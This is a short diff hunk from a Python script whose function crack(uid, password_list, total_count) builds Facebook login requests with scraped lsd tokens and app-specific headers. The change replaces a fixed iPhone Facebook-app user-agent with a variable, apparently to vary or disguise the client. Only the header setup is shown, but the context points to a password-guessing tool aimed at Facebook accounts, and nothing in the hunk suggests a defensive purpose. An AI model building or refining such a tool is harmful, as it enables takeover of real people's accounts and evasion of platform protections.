@@ -186,7 +186,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F84 Safari/604.1 [FBAN/FBIOS;FBAV/569.0.0.55.71;FBBV/1012639507;FBDV/iPhone14,4;FBMD/iPhone;FBSN/iOS;FBSV/26.5.2;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/1018075803;IABMV/1]',
+            'user-agent': us,
             'x-asbd-id': '359341',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'x-requested-with': 'XMLHttpRequest',
